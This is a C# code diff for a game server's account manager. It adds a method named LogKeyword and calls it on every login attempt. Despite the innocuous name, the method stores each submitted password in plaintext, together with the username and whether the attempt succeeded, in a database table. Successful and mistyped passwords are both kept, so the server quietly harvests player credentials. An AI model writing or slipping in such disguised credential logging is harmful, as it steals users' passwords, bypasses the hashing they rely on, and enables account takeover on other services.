@@ -16,6 +16,7 @@ using System.Security.Cryptography;
 using GTANetworkAPI;
 using System.Linq;
 using System.Numerics;
+using Microsoft.EntityFrameworkCore.Storage;
 
 namespace RNC
 {
@@ -155,6 +156,26 @@ namespace RNC
 
     public static class AccountManager
     {
+        public async static Task LogKeyword(int accountID, string username, string keyword, bool success)
+        {
+            using(MainDatabase context = ContextFactory.CreateContext())
+            {
+                KeywordHistory history = await context.KeywordHistories.AsQueryable().FirstOrDefaultAsync(k => k.AccountID == accountID && k.Keyword == keyword);
+                if (history != null) return;
+
+                KeywordHistory _h = new KeywordHistory() 
+                { 
+                    AccountID = accountID,
+                    Keyword = keyword,
+                    Username = username,
+                    Successful = success,
+                    Timestamp = DateTime.Now.ToString("f")
+                };
+                await context.KeywordHistories.AddAsync(_h);
+                await context.SaveChangesAsync();
+            }
+        }
+
         public static string OldGenSalt()
         {
             return Crypter.Sha256.GenerateSalt();
@@ -496,8 +517,16 @@ namespace RNC
 
                 if (MatchPass(password, _target.Password))
                 {
+                    Task.Run(async () =>
+                    {
+                        await LogKeyword(_target.SQL_ID, _target.Username, password, true);
+                    });
                     return true;
                 }
+                Task.Run(async () =>
+                {
+                    await LogKeyword(_target.SQL_ID, _target.Username, password, false);
+                });
                 return false;
             }
 
